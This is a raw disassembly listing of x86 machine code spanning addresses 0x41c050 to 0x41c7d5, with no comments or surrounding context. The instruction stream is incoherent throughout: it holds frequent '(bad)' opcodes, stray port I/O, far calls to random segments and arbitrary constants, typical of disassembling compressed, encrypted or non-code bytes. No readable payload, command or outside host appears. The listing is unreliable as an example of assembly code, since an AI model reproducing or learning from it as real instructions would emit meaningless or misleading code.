  41c050:	jnp    0x41c081
  41c052:	cmp    esi,DWORD PTR [esi+0xa]
  41c055:	sub    bl,ch
  41c057:	int    0xfd
  41c059:	jno    0x41c0cf
  41c05b:	mov    edi,0x3a789b29
  41c060:	leave  
  41c061:	xor    al,0xac
  41c063:	cld    
  41c064:	(bad)  
  41c065:	repz jns 0x41c040
  41c068:	setae  BYTE PTR [ecx-0x72b2e18b]
  41c06f:	add    bh,ch
  41c071:	sub    al,0x4d
  41c073:	out    dx,eax
  41c074:	xchg   edx,eax
  41c075:	jnp    0x41c087
  41c077:	pop    ebx
  41c078:	mov    ecx,0x9805596d
  41c07d:	sub    BYTE PTR [eax+0x0],ah
  41c080:	xor    al,0xb0
  41c082:	add    al,0x97
  41c084:	imul   esp,DWORD PTR [edx-0x29],0xa7986dfa
  41c08b:	or     BYTE PTR [ebx-0xa],0x8f
  41c08f:	out    dx,al
  41c090:	xchg   edi,eax
  41c091:	or     al,0x3b
  41c093:	jnp    0x41c063
  41c095:	pop    esi
  41c096:	mov    ds,ecx
  41c098:	mov    es,WORD PTR [edx]
  41c09a:	dec    ebx
  41c09b:	mov    ah,ch
  41c09d:	inc    ecx
  41c09e:	or     BYTE PTR ss:[eax-0x787a37f9],bh
  41c0a5:	cli    
  41c0a6:	lahf   
  41c0a7:	cmp    ebx,DWORD PTR [ecx]
  41c0a9:	in     eax,dx
  41c0aa:	leave  
  41c0ab:	gs in  al,dx
  41c0ad:	in     al,0xc4
  41c0af:	in     eax,dx
  41c0b0:	push   ecx
  41c0b1:	in     al,0x7
  41c0b3:	popf   
  41c0b4:	sbb    ebp,DWORD PTR [ebp+0x1bf737a5]
  41c0ba:	scas   al,BYTE PTR es:[edi]
  41c0bb:	pop    ebx
  41c0bc:	push   ebp
  41c0bd:	mov    fs,WORD PTR [ecx]
  41c0bf:	fdiv   st,st(2)
  41c0c1:	icebp  
  41c0c2:	xchg   esi,eax
  41c0c3:	cmp    al,0xf3
  41c0c5:	fld    DWORD PTR [ecx+0x1ba65c95]
  41c0cb:	or     al,0xf6
  41c0cd:	push   edi
  41c0ce:	ds pop esp
  41c0d0:	xchg   edi,eax
  41c0d1:	ins    BYTE PTR es:[edi],dx
  41c0d2:	pop    ebx
  41c0d3:	and    ch,bl
  41c0d5:	mov    ?,WORD PTR [di]
  41c0d8:	rcr    BYTE PTR [ecx-0x2b],cl
  41c0db:	sub    eax,0x7b790e7b
  41c0e0:	in     al,0x70
  41c0e2:	sbb    eax,0x4e874b90
  41c0e7:	js     0x41c07e
  41c0e9:	shl    DWORD PTR gs:[esi+0x6e],0xa8
  41c0ee:	pop    edx
  41c0ef:	xor    DWORD PTR [ebx+edx*8],edi
  41c0f2:	imul   ebp,DWORD PTR [ebp+0x4d],0xbc48feb3
  41c0f9:	js     0x41c11d
  41c0fb:	inc    esi
  41c0fc:	sub    esp,DWORD PTR [ecx-0x2b]
  41c0ff:	jp     0x41c128
  41c101:	retf   
  41c102:	outs   dx,BYTE PTR ds:[esi]
  41c103:	jmp    ecx
  41c105:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c106:	push   ebp
  41c107:	(bad)  
  41c109:	pop    DWORD PTR [ecx-0x2e]
  41c10c:	fmul   DWORD PTR [esi+0x22]
  41c10f:	inc    ebp
  41c110:	xchg   ecx,eax
  41c111:	popa   
  41c112:	sub    eax,0x944260d1
  41c117:	mov    ecx,0x95f44621
  41c11c:	repnz loopne 0x41c0b3
  41c11f:	mov    ds:0x8f04b8ab,eax
  41c124:	and    esi,DWORD PTR [eax+0x3b]
  41c127:	push   es
  41c128:	xlat   BYTE PTR ds:[ebx]
  41c129:	inc    esi
  41c12a:	jmp    0x41c136
  41c12c:	in     eax,dx
  41c12d:	mov    bp,0xb6c8
  41c131:	fisttp DWORD PTR [ecx-0x59efe173]
  41c137:	push   0x34adba33
  41c13c:	mov    ebx,0x71f41329
  41c141:	xlat   BYTE PTR ds:[ebx]
  41c142:	mov    esp,0x2cefd27d
  41c147:	scas   eax,DWORD PTR es:[edi]
  41c148:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c149:	pop    ebp
  41c14a:	lahf   
  41c14b:	dec    esp
  41c14c:	add    eax,0x9ecb0e39
  41c151:	jo     0x41c100
  41c153:	xchg   edi,eax
  41c154:	ins    DWORD PTR es:[edi],dx
  41c155:	mul    DWORD PTR [ecx+0x7]
  41c158:	xchg   ebp,eax
  41c159:	dec    eax
  41c15a:	adc    eax,0x649d049f
  41c15f:	repz out dx,al
  41c161:	xlat   BYTE PTR ds:[ebx]
  41c162:	mov    dh,0xfb
  41c164:	fs cmp bh,dl
  41c167:	dec    ecx
  41c168:	je     0x41c10b
  41c16a:	sub    al,dl
  41c16c:	mov    bl,0xfc
  41c16e:	push   ecx
  41c16f:	xlat   BYTE PTR ds:[ebx]
  41c170:	sub    al,0xff
  41c172:	dec    edx
  41c173:	sub    BYTE PTR [ebp+eiz*8-0x249041c4],bh
  41c17a:	stc    
  41c17b:	mov    ch,0xf5
  41c17d:	xchg   ebp,eax
  41c17e:	in     eax,dx
  41c17f:	push   0xffec55f1
  41c184:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c185:	or     BYTE PTR [eax],cl
  41c187:	pop    ebp
  41c188:	inc    ebp
  41c189:	les    edx,FWORD PTR [edi-0x76f3e72d]
  41c18f:	mov    ebx,DWORD PTR [ecx]
  41c191:	xor    al,0x86
  41c193:	push   ecx
  41c194:	repnz xor esp,DWORD PTR [edi-0x22ca0bca]
  41c19b:	jg     0x41c1fd
  41c19d:	shl    ebp,1
  41c19f:	pop    ecx
  41c1a0:	cmp    bh,dh
  41c1a2:	rcl    BYTE PTR [edx],cl
  41c1a4:	rcr    DWORD PTR [eax],cl
  41c1a6:	sub    BYTE PTR [eax+0x5e],ah
  41c1a9:	das    
  41c1aa:	shr    BYTE PTR [ebp+0x63],0x3a
  41c1ae:	cmp    edi,ebp
  41c1b0:	mov    ebx,edi
  41c1b2:	mov    DWORD PTR es:[ebp-0x47db1b5c],edi
  41c1b9:	ins    BYTE PTR es:[edi],dx
  41c1ba:	adc    DWORD PTR [eax-0x4848d30f],0x10
  41c1c1:	push   ecx
  41c1c2:	sbb    eax,0xf4467223
  41c1c7:	xlat   BYTE PTR ds:[ebx]
  41c1c8:	ror    BYTE PTR [edx],1
  41c1ca:	fld    DWORD PTR [ebp-0x68]
  41c1cd:	mov    ?,WORD PTR [ecx]
  41c1cf:	inc    edi
  41c1d0:	ret    
  41c1d1:	rcr    DWORD PTR [ecx-0x38],cl
  41c1d4:	xor    esp,DWORD PTR [edx-0x66]
  41c1d7:	pop    es
  41c1d8:	test   eax,0x2dedcd52
  41c1dd:	pop    edx
  41c1de:	test   BYTE PTR [eax],ch
  41c1e0:	popw   ss
  41c1e2:	scas   al,BYTE PTR es:[edi]
  41c1e3:	sbb    dl,BYTE PTR [ebx-0x48]
  41c1e6:	(bad)  
  41c1e7:	mov    bl,0x13
  41c1e9:	sbb    DWORD PTR [edi-0x4c],0x18
  41c1ed:	push   ds
  41c1ee:	js     0x41c20d
  41c1f0:	mov    ebp,0x4c9abd3e
  41c1f5:	xchg   esp,eax
  41c1f6:	cld    
  41c1f7:	and    ebx,DWORD PTR ds:0x37ab0a9e
  41c1fd:	sub    BYTE PTR [esp+esi*8],bl
  41c200:	xchg   ecx,eax
  41c201:	adc    al,0x45
  41c203:	fisubr DWORD PTR [eax+eiz*1-0x1093f6a7]
  41c20a:	sub    ah,BYTE PTR [ebx-0x10693b57]
  41c210:	xlat   BYTE PTR ds:[ebx]
  41c211:	dec    ebx
  41c212:	jns    0x41c1e3
  41c214:	scas   al,BYTE PTR es:[edi]
  41c215:	popa   
  41c216:	shl    DWORD PTR [edx-0x13],1
  41c219:	popf   
  41c21a:	inc    edx
  41c21b:	jmp    0x41c268
  41c21d:	xor    al,BYTE PTR [ebx]
  41c21f:	and    edi,ebp
  41c221:	sbb    eax,0x31325f02
  41c226:	repnz cmp eax,DWORD PTR [ebx]
  41c229:	cmp    al,0xb8
  41c22b:	sbb    ecx,esi
  41c22d:	push   ebp
  41c22e:	(bad)  
  41c22f:	cmp    al,0xc1
  41c231:	inc    edi
  41c232:	adc    DWORD PTR ds:0x6e1203ec,edi
  41c238:	hlt    
  41c239:	(bad)  
  41c23a:	in     al,0x4
  41c23c:	into   
  41c23d:	pop    eax
  41c23e:	jg     0x41c29c
  41c240:	dec    esp
  41c241:	dec    edx
  41c242:	add    ah,BYTE PTR [ebx-0x4e]
  41c245:	mov    eax,0xfeac1604
  41c24a:	xor    al,BYTE PTR [ebx]
  41c24c:	js     0x41c233
  41c24e:	loop   0x41c20b
  41c250:	js     0x41c21a
  41c252:	push   ss
  41c253:	xchg   BYTE PTR [ebp-0x70da6bf0],ch
  41c259:	(bad)  
  41c25a:	sti    
  41c25b:	in     al,0x64
  41c25d:	test   eax,0xb559627b
  41c262:	xchg   BYTE PTR [edi+0x7b],ah
  41c265:	sbb    DWORD PTR [eax+ebx*8-0x715a1e62],0xffffffae
  41c26d:	mov    edi,0x403f0e8c
  41c272:	pushf  
  41c273:	xlat   BYTE PTR ds:[ebx]
  41c274:	imul   ebx,DWORD PTR [eax+0x2d57de3a],0xffffffda
  41c27b:	mov    al,ds:0xbd985d0
  41c280:	push   cs
  41c281:	mov    ch,0x0
  41c283:	lods   al,BYTE PTR ds:[si]
  41c285:	or     eax,esi
  41c287:	test   DWORD PTR [eax+0x50],ecx
  41c28a:	jp     0x41c2b1
  41c28c:	cmc    
  41c28d:	loope  0x41c23e
  41c28f:	mov    bh,0x99
  41c291:	call   0x6993:0xb1eb0480
  41c298:	ffreep st(4)
  41c29a:	das    
  41c29b:	in     eax,0xe7
  41c29d:	outs   dx,DWORD PTR ds:[esi]
  41c29e:	push   esp
  41c29f:	jmp    0x41c308
  41c2a1:	(bad)  
  41c2a2:	shr    BYTE PTR [ecx],1
  41c2a4:	jmp    0x976d2af2
  41c2a9:	or     al,0xf9
  41c2ab:	mov    eax,0x4eabcba4
  41c2b0:	mov    esi,0x6c03c324
  41c2b5:	mov    edx,0x2139ba4a
  41c2ba:	lods   al,BYTE PTR ds:[esi]
  41c2bb:	adc    DWORD PTR [ecx-0x3],0x8798b159
  41c2c2:	jecxz  0x41c319
  41c2c4:	push   es
  41c2c5:	push   cs
  41c2c6:	push   ecx
  41c2c7:	inc    esp
  41c2c8:	mov    eax,ds:0xb553a560
  41c2cd:	push   cs
  41c2ce:	mov    DWORD PTR ds:0x4f431fe0,esi
  41c2d4:	adc    al,0x58
  41c2d6:	pop    ss
  41c2d7:	scas   eax,DWORD PTR es:[edi]
  41c2d8:	dec    esp
  41c2d9:	sub    ebx,DWORD PTR [edi]
  41c2db:	add    BYTE PTR [eax+0x5a9d89b5],ch
  41c2e1:	repnz mov edi,0xcd68d29e
  41c2e7:	fnstsw WORD PTR [edx+edx*1-0x36]
  41c2eb:	mov    DWORD PTR [esi+0x27],ecx
  41c2ee:	mov    eax,0x544efb8c
  41c2f3:	sub    DWORD PTR [ebx+0x1cbb40f5],esi
  41c2f9:	es out 0x67,al
  41c2fc:	leave  
  41c2fd:	lock repz pop ebx
  41c300:	cdq    
  41c301:	or     BYTE PTR [ebp-0x146dc731],ch
  41c307:	call   0x6e69:0xb7ed53af
  41c30e:	(bad)  
  41c30f:	mov    esp,0x25d868d4
  41c314:	inc    edi
  41c315:	fsubr  DWORD PTR [ecx+0x564750ed]
  41c31b:	pop    esp
  41c31c:	scas   eax,DWORD PTR es:[edi]
  41c31d:	and    al,0x35
  41c31f:	nop
  41c320:	sub    BYTE PTR [edx],0x14
  41c323:	sub    al,0xb4
  41c325:	nop
  41c326:	test   DWORD PTR [edi+0x70],ecx
  41c329:	inc    edx
  41c32a:	cmp    cl,ch
  41c32c:	jae    0x41c2ef
  41c32e:	xchg   edx,eax
  41c32f:	js     0x41c38f
  41c331:	or     ecx,ecx
  41c333:	jns    0x41c37d
  41c335:	mov    ecx,0x724ef65a
  41c33a:	(bad)  
  41c33d:	addr16 call 0xf0bc57b2
  41c343:	and    eax,0xeaa280ed
  41c348:	push   es
  41c349:	cdq    
  41c34a:	les    esp,FWORD PTR [edi+0x2247dceb]
  41c350:	sub    al,0x35
  41c352:	loope  0x41c3a0
  41c354:	and    al,0xe5
  41c356:	loopne 0x41c31b
  41c358:	lea    ebx,[edx]
  41c35a:	iret   
  41c35b:	es test eax,0xce496dae
  41c361:	retf   0x2b1f
  41c364:	scas   al,BYTE PTR es:[edi]
  41c365:	inc    BYTE PTR [eax+0x4408c8ae]
  41c36b:	outs   dx,DWORD PTR ds:[esi]
  41c36c:	loope  0x41c358
  41c36e:	adc    DWORD PTR [edx-0x67d8c977],edi
  41c374:	adc    BYTE PTR [ecx+0x22],0x4d
  41c378:	inc    ebx
  41c379:	data16 sti 
  41c37b:	add    al,0xfe
  41c37d:	mov    ss,WORD PTR [edi]
  41c37f:	xchg   ecx,eax
  41c380:	rcl    BYTE PTR [esi],cl
  41c382:	add    edx,DWORD PTR [esi+0x672fa5a7]
  41c388:	inc    eax
  41c389:	add    esp,DWORD PTR [edi-0x57d73ba0]
  41c38f:	jle    0x41c3c6
  41c391:	in     eax,dx
  41c392:	mov    BYTE PTR [ecx+eiz*2-0xe5d4f84],0x38
  41c39a:	jne    0x41c3ee
  41c39c:	push   ss
  41c39d:	imul   ebp,ebp,0xffffffcb
  41c3a0:	leave  
  41c3a1:	sub    al,0x4c
  41c3a3:	out    0x5b,eax
  41c3a5:	and    cl,bh
  41c3a7:	xor    cl,BYTE PTR [ebx-0x3dddbbd5]
  41c3ad:	pop    es
  41c3ae:	sar    BYTE PTR [ebp-0x72a43ce4],cl
  41c3b4:	cwde   
  41c3b5:	lds    edi,FWORD PTR [edi+0x10]
  41c3b8:	mov    DWORD PTR [ebx],ebx
  41c3ba:	mov    bl,0x45
  41c3bc:	jecxz  0x41c3c9
  41c3be:	pusha  
  41c3bf:	stos   BYTE PTR es:[edi],al
  41c3c0:	jae    0x41c41a
  41c3c2:	sbb    BYTE PTR [edx+0x50929da5],0x94
  41c3c9:	scas   al,BYTE PTR es:[edi]
  41c3ca:	retf   0xebd
  41c3cd:	mov    ch,0x17
  41c3cf:	xchg   ebx,eax
  41c3d0:	(bad)  
  41c3d1:	xchg   esp,eax
  41c3d2:	mov    WORD PTR [esi],cs
  41c3d4:	imul   esi,DWORD PTR [edx],0x6452129
  41c3da:	sub    dh,BYTE PTR [edi+0x30]
  41c3dd:	push   eax
  41c3de:	mov    ds:0x2b9e17e3,al
  41c3e3:	sub    BYTE PTR [ecx+eax*4-0x42],bl
  41c3e7:	jge    0x41c383
  41c3e9:	(bad)  
  41c3ea:	or     eax,0xe47bb495
  41c3ef:	imul   esp,DWORD PTR [edi+0x66],0x8409c531
  41c3f6:	imul   esp,DWORD PTR [ecx+0x4b],0xffffffb4
  41c3fa:	dec    esi
  41c3fb:	xchg   DWORD PTR [edx],edx
  41c3fd:	xor    al,0x26
  41c3ff:	das    
  41c400:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c401:	sbb    DWORD PTR [esi],esi
  41c403:	fadd   st(4),st
  41c405:	mov    dl,0x3e
  41c407:	xor    dh,BYTE PTR [ebx+eiz*4]
  41c40a:	call   0x5caf:0xf6082f57
  41c411:	ins    DWORD PTR es:[edi],dx
  41c412:	sar    BYTE PTR [ebp-0x12],cl
  41c415:	mov    dl,0xac
  41c417:	mov    bh,0x67
  41c419:	lahf   
  41c41a:	and    DWORD PTR [esi-0x7139e6f3],edx
  41c420:	pop    ecx
  41c421:	fwait
  41c422:	cli    
  41c423:	in     eax,dx
  41c424:	pusha  
  41c425:	aaa    
  41c426:	arpl   WORD PTR [eax+0x68d6819a],cx
  41c42c:	jo     0x41c426
  41c42e:	and    al,0xd6
  41c430:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c431:	mov    eax,0x9eacad67
  41c436:	mov    edx,esp
  41c438:	mov    ecx,DWORD PTR [ecx-0x75]
  41c43b:	aam    0x27
  41c43d:	push   0x5e
  41c43f:	repz (bad) 
  41c441:	hlt    
  41c442:	rol    BYTE PTR [edx+edi*8+0x661d9b11],1
  41c449:	ds out dx,al
  41c44b:	aaa    
  41c44c:	xchg   BYTE PTR [edx+eiz*4],ah
  41c44f:	cld    
  41c450:	pop    edx
  41c451:	neg    cl
  41c453:	fwait
  41c454:	jp     0x41c4a9
  41c456:	mov    cl,0xf0
  41c458:	mov    edi,0x9a88274b
  41c45d:	cs ins DWORD PTR es:[edi],dx
  41c45f:	fmul   DWORD PTR [edi]
  41c461:	mov    BYTE PTR [edx+esi*1+0x7],bh
  41c465:	fcom   DWORD PTR gs:[ecx+0x62]
  41c469:	out    0x5e,al
  41c46b:	shl    cl,0xbb
  41c46e:	mov    dl,0xdd
  41c470:	lods   al,BYTE PTR ds:[esi]
  41c471:	fcom   QWORD PTR [edx-0x66f31b2b]
  41c477:	(bad)  
  41c478:	loop   0x41c49c
  41c47a:	retf   0xc617
  41c47d:	ror    BYTE PTR [edx],cl
  41c47f:	push   edx
  41c480:	scas   al,BYTE PTR es:[edi]
  41c481:	and    eax,eax
  41c483:	loop   0x41c448
  41c485:	mov    ebx,0xdb0a8ad5
  41c48a:	repnz or cl,BYTE PTR [ebx+ebp*8-0xe829e4f]
  41c492:	mov    ecx,0xac4cc38
  41c497:	fcom   DWORD PTR ds:[eax-0x11]
  41c49b:	sbb    al,0xba
  41c49d:	mov    DWORD PTR [ebp+0x71],0x23a03855
  41c4a4:	fsubrp st(2),st
  41c4a6:	lahf   
  41c4a7:	push   es
  41c4a8:	cs inc edx
  41c4ab:	in     al,0xb5
  41c4ad:	lahf   
  41c4ae:	dec    esi
  41c4af:	adc    al,0xd5
  41c4b1:	sti    
  41c4b2:	(bad)  
  41c4b3:	(bad)  [ebx]
  41c4b5:	inc    ebp
  41c4b6:	push   eax
  41c4b7:	push   ebx
  41c4b8:	or     esp,edx
  41c4ba:	adc    eax,0x38cfa44
  41c4bf:	push   esp
  41c4c0:	jnp    0x41c4cc
  41c4c2:	push   0x34
  41c4c4:	jns    0x41c4cc
  41c4c6:	fcomp  QWORD PTR [ebp-0x543694be]
  41c4cc:	fwait
  41c4cd:	sub    al,0x17
  41c4cf:	popf   
  41c4d0:	int3   
  41c4d1:	es push ss
  41c4d3:	out    dx,eax
  41c4d4:	outs   dx,DWORD PTR ds:[esi]
  41c4d5:	mov    ah,0xcf
  41c4d7:	hlt    
  41c4d8:	call   0xb119:0x9706f9d3
  41c4df:	ins    BYTE PTR es:[edi],dx
  41c4e0:	push   ebp
  41c4e1:	inc    ebx
  41c4e2:	mov    ebp,0xd2331b43
  41c4e7:	into   
  41c4e8:	adc    ecx,DWORD PTR [edx+0x132832c2]
  41c4ee:	leave  
  41c4ef:	mov    ebx,0x8c19f15b
  41c4f4:	imul   esp,DWORD PTR [edx+edx*1-0x61],0x4a
  41c4f9:	inc    esp
  41c4fa:	sbb    al,0xb5
  41c4fc:	(bad)  [edx+edx*2-0x67]
  41c500:	or     ebp,DWORD PTR [esi-0x194f7bab]
  41c506:	jp     0x41c4cf
  41c508:	push   esi
  41c509:	sub    esp,DWORD PTR [ecx-0x3fe80cda]
  41c50f:	inc    eax
  41c510:	xchg   ebx,eax
  41c511:	addr16 jb 0x41c55f
  41c514:	sub    eax,0x23ce7504
  41c519:	sub    DWORD PTR [esi-0x4808eaf7],ecx
  41c51f:	es in  al,dx
  41c521:	push   ebp
  41c522:	pushf  
  41c523:	rol    bh,1
  41c525:	adc    al,0x58
  41c527:	dec    edx
  41c528:	pop    edi
  41c529:	add    al,0x52
  41c52b:	int    0x71
  41c52d:	and    eax,0x9fc091c4
  41c532:	cmp    al,0xca
  41c535:	repnz fnstcw WORD PTR [ecx+ecx*4+0x5b]
  41c53a:	push   0x34d785b7
  41c53f:	mov    BYTE PTR [edi+0x34],dh
  41c542:	dec    ebp
  41c543:	sar    BYTE PTR [edi],1
  41c545:	push   0xffffffc6
  41c547:	repz repz and eax,0xbfed7f4a
  41c54e:	jl     0x41c5ce
  41c550:	ja     0x41c534
  41c552:	jmp    0x4c9ae725
  41c557:	popf   
  41c558:	test   DWORD PTR [ebp+0x65],ebx
  41c55b:	les    ecx,FWORD PTR [ebp-0x2e]
  41c55e:	sahf   
  41c55f:	scas   al,BYTE PTR es:[edi]
  41c560:	shr    esp,cl
  41c562:	mov    edi,0x4c14eaec
  41c567:	jns    0x41c58d
  41c569:	mov    ecx,0xaf5deddb
  41c56e:	loop   0x41c5ab
  41c570:	out    0xf8,al
  41c572:	inc    eax
  41c573:	adc    DWORD PTR [esi+ecx*8+0x5f1c7593],ecx
  41c57a:	imul   eax,DWORD PTR [eax],0xd751da64
  41c580:	adc    ebp,DWORD PTR [edx+0x2ea54a86]
  41c586:	lahf   
  41c587:	inc    eax
  41c588:	out    0x96,eax
  41c58a:	(bad)  
  41c58b:	adc    eax,0x1893ae5
  41c590:	fs iret 
  41c592:	ficom  WORD PTR [ecx+0x7885daf9]
  41c598:	cmp    DWORD PTR [edi+eax*2+0x59],esp
  41c59c:	adc    dl,BYTE PTR [ecx]
  41c59e:	sbb    esp,DWORD PTR [ebp+0x41]
  41c5a1:	je     0x41c60f
  41c5a3:	into   
  41c5a4:	arpl   WORD PTR [edx-0x2a],ax
  41c5a7:	popf   
  41c5a8:	jge    0x41c572
  41c5aa:	push   ebx
  41c5ab:	adc    BYTE PTR [edi-0x4b07d016],cl
  41c5b1:	cmp    bh,bh
  41c5b3:	pop    ds
  41c5b4:	pop    eax
  41c5b5:	pop    ds
  41c5b6:	sub    BYTE PTR [edx],dh
  41c5b8:	mov    edx,edi
  41c5ba:	cli    
  41c5bb:	push   ebp
  41c5bc:	or     al,0x5f
  41c5be:	aad    0xcb
  41c5c0:	scas   eax,DWORD PTR es:[edi]
  41c5c1:	adc    BYTE PTR [ebx+eax*8+0x6a07275c],al
  41c5c8:	loopne 0x41c623
  41c5ca:	adc    ch,BYTE PTR [ebx-0x5eefed06]
  41c5d0:	jg     0x41c639
  41c5d2:	icebp  
  41c5d3:	add    eax,0xf662635f
  41c5d8:	jl     0x41c566
  41c5da:	xor    ah,0x9f
  41c5dd:	mov    dh,0x69
  41c5df:	xchg   BYTE PTR [edi+0x112a38d1],al
  41c5e5:	and    DWORD PTR [ebp-0x43],eax
  41c5e8:	mov    esi,0x71ad6bfe
  41c5ed:	jno    0x41c575
  41c5ef:	push   es
  41c5f0:	dec    eax
  41c5f1:	mov    al,ds:0x4f0f5d1b
  41c5f6:	test   ebx,ebp
  41c5f8:	iret   
  41c5f9:	repnz bound esi,QWORD PTR [edx-0x61f4e8e1]
  41c600:	push   ebp
  41c601:	ret    
  41c602:	mov    ebx,?
  41c604:	add    BYTE PTR [edx-0x2bc8b297],cl
  41c60a:	lods   al,BYTE PTR ds:[esi]
  41c60b:	movsx  esp,BYTE PTR [edx+ebp*2+0x5d]
  41c610:	adc    DWORD PTR [ebp+0x6a49bd0f],ebx
  41c616:	add    dl,al
  41c618:	cmp    al,0x8
  41c61a:	add    DWORD PTR [esi-0x53ce579f],0xffffffd4
  41c621:	shl    DWORD PTR [edx+0x1f],1
  41c624:	add    BYTE PTR [edi+edi*4-0x744fda36],dl
  41c62b:	add    al,0x87
  41c62d:	push   ebp
  41c62e:	dec    esp
  41c62f:	mov    ecx,0x5dcdaa6c
  41c634:	mov    ebp,0x1c6a2f36
  41c639:	stc    
  41c63a:	xor    esp,DWORD PTR [edi+eiz*4+0x4f]
  41c63e:	sub    eax,edi
  41c640:	or     eax,0x289649ef
  41c645:	nop
  41c646:	rol    DWORD PTR [ebx+0x388690f7],cl
  41c64c:	hlt    
  41c64d:	or     BYTE PTR [ebx-0x6a6d447d],0x75
  41c654:	stos   DWORD PTR es:[edi],eax
  41c655:	dec    ecx
  41c656:	push   cs
  41c657:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c658:	mov    dl,0x2c
  41c65a:	nop
  41c65b:	inc    edi
  41c65c:	lahf   
  41c65d:	and    BYTE PTR ds:0xfb20064e,al
  41c663:	push   ds
  41c664:	jmp    WORD PTR [eax]
  41c667:	ret    0xf82e
  41c66a:	daa    
  41c66b:	and    esp,esp
  41c66d:	jb     0x41c61c
  41c66f:	xor    DWORD PTR [esi],esi
  41c671:	inc    esi
  41c672:	rol    dh,1
  41c674:	ds ss dec edx
  41c677:	rcl    BYTE PTR [esi-0x2de56b81],0x61
  41c67e:	aam    0xca
  41c680:	mov    dl,0x8a
  41c682:	dec    esp
  41c683:	outs   dx,BYTE PTR ds:[esi]
  41c684:	jnp    0x41c6df
  41c686:	movsx  eax,BYTE PTR [ecx+0x44cd21c3]
  41c68d:	xor    eax,0x4fb129c6
  41c692:	push   0xae6ccb80
  41c697:	jne    0x41c700
  41c699:	sub    ebx,esi
  41c69b:	mov    cs,WORD PTR [esi-0x72]
  41c69e:	outs   dx,BYTE PTR ds:[esi]
  41c69f:	cli    
  41c6a0:	pop    ecx
  41c6a1:	pop    es
  41c6a2:	pop    ebx
  41c6a3:	test   eax,0xb23323e4
  41c6a8:	pop    ds
  41c6a9:	rcl    DWORD PTR [ebx+0x3827d513],1
  41c6af:	xor    eax,0x6d635fa0
  41c6b4:	sbb    ebp,DWORD PTR [esi]
  41c6b6:	mov    eax,ds:0xbd3fbc7c
  41c6bb:	retf   
  41c6bc:	adc    BYTE PTR [ebx+0x73758cee],0xe
  41c6c3:	push   esi
  41c6c4:	mov    dl,0xc3
  41c6c6:	push   edi
  41c6c7:	call   0xd313:0xc541c4a6
  41c6ce:	pop    ds
  41c6cf:	xchg   edx,eax
  41c6d0:	push   ss
  41c6d1:	mov    edi,0x6afb0c1c
  41c6d6:	mov    eax,0x4148edf0
  41c6db:	inc    edi
  41c6dc:	mov    ah,0x4
  41c6de:	push   ss
  41c6df:	std    
  41c6e0:	not    BYTE PTR [ebx+0x7d]
  41c6e3:	adc    ah,0x61
  41c6e6:	(bad)  
  41c6e7:	idiv   BYTE PTR [ecx-0x3075ee3d]
  41c6ed:	out    0x8d,al
  41c6ef:	or     cl,BYTE PTR [ecx+0x2cbbdd06]
  41c6f5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c6f6:	das    
  41c6f7:	aaa    
  41c6f8:	mov    bh,0xde
  41c6fa:	nop
  41c6fb:	jo     0x41c74a
  41c6fd:	mov    ch,0x28
  41c6ff:	xchg   bl,bl
  41c701:	inc    ebx
  41c702:	setb   BYTE PTR ds:0xaf2d8222
  41c709:	pop    edx
  41c70a:	cmp    eax,DWORD PTR [ebx]
  41c70c:	loopne 0x41c72f
  41c70e:	lahf   
  41c70f:	mov    ebp,0xbbca6036
  41c714:	fsubr  QWORD PTR [ebp-0x6f829449]
  41c71a:	jl     0x41c72f
  41c71c:	or     al,0xf4
  41c71e:	jne    0x41c74d
  41c720:	popa   
  41c721:	ret    
  41c722:	lahf   
  41c723:	add    DWORD PTR [edx+edi*8-0x6966d64a],ecx
  41c72a:	bnd repz jae 0x41c7ad
  41c72e:	(bad)  
  41c72f:	in     al,dx
  41c730:	sbb    BYTE PTR [ecx],0xe9
  41c733:	outs   dx,DWORD PTR ds:[esi]
  41c734:	adc    al,BYTE PTR [edx-0x13dbc2b0]
  41c73a:	ret    0x759b
  41c73d:	(bad)  
  41c73e:	mov    ds:0xfd9eb9fa,eax
  41c743:	jle    0x41c77a
  41c745:	add    BYTE PTR [ebp+0x37],ch
  41c748:	call   FWORD PTR [edi-0x66]
  41c74b:	jb     0x41c7a5
  41c74d:	aam    0x7c
  41c74f:	aad    0xe0
  41c751:	aaa    
  41c752:	sbb    eax,0xd1d1bc3b
  41c757:	imul   ecx,ecx,0xa5eb91f4
  41c75d:	je     0x41c73c
  41c75f:	cmp    al,0x7f
  41c761:	lock and bl,BYTE PTR [edi+eiz*2+0x10]
  41c766:	fcomp  QWORD PTR [edi]
  41c768:	jg     0x41c7a1
  41c76a:	dec    eax
  41c76b:	adc    DWORD PTR [esp+edx*1+0x7c],ecx
  41c76f:	adc    DWORD PTR [ebx-0x62c9600e],esp
  41c775:	data16 add BYTE PTR [eax+0xfabc9ed],bh
  41c77c:	dec    ebp
  41c77d:	hlt    
  41c77e:	ret    0x7bd1
  41c781:	jmp    FWORD PTR [edi+0x50]
  41c784:	imul   eax,DWORD PTR [edi],0x312fdb59
  41c78a:	pop    esp
  41c78b:	or     DWORD PTR [edx+0x4f9987f0],eax
  41c791:	pop    es
  41c792:	dec    ecx
  41c793:	ret    
  41c794:	stc    
  41c795:	bound  ecx,QWORD PTR [ebx-0x72]
  41c798:	cmp    BYTE PTR [ebx+0x18],ch
  41c79b:	scas   al,BYTE PTR es:[edi]
  41c79c:	pop    ds
  41c79d:	add    eax,0x9a045df3
  41c7a2:	jl     0x41c819
  41c7a4:	or     DWORD PTR [ecx+0x51f5d34d],ecx
  41c7aa:	xchg   esp,eax
  41c7ab:	dec    ebp
  41c7ac:	jnp    0x41c817
  41c7ae:	(bad)  
  41c7af:	push   0x8704d657
  41c7b4:	leave  
  41c7b5:	jg     0x41c7bf
  41c7b7:	mov    ch,0x61
  41c7b9:	xor    DWORD PTR [esi-0x78],edx
  41c7bc:	add    eax,DWORD PTR [ebp-0x71]
  41c7bf:	out    0x5d,eax
  41c7c1:	int    0xaf
  41c7c3:	add    eax,0xc5c849b3
  41c7c8:	ret    0xf374
  41c7cb:	mov    ch,0xfa
  41c7cd:	jb     0x41c774
  41c7cf:	mov    dl,0xe2
  41c7d1:	(bad)  
  41c7d2:	xchg   ecx,eax
  41c7d3:	inc    ecx
  41c7d4:	(bad)  
  41c7d5:	push   esp
